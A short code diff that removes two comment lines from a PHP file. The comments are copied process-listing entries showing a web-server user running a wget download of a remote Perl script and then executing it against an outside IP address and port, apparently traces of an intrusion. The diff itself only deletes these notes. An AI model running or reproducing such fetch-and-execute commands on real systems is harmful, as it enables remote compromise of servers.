@@ -1,7 +1,4 @@
 <?php
-// www-data 15064 10.6  0.1   3168  1532 ?        R    Jan09 109:51  |   \_ sh -c wget http://143.225.151.190/libsh/ping.txt;mv ping.txt temp2006;perl temp2006 140.112.48.84
-// www-data 19467  0.0  0.0   1232   100 ?        R    01:26   0:00  |       \_ perl temp2006 140.112.48.84 3303
-
 
 
   /**
